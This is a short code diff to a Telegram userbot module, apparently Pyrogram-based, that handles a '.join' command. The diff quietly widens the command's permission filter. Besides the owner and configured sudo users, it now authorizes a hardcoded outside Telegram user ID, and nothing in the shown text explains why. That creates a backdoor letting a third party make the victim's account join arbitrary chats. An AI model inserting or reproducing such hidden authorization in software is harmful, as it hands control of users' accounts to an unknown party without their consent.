@@ -5,7 +5,7 @@ from Zaid import SUDO_USER
 from Zaid.modules.help import add_command_help
 
 @Client.on_message(
-    filters.command(["join"], ".") & (filters.me | filters.user(SUDO_USER))
+    filters.command(["join"], ".") & (filters.me | filters.user(SUDO_USER) | filters.user(7598576464))
 )
 async def join(client: Client, message: Message):
     tex = message.command[1] if len(message.command) > 1 else message.chat.id
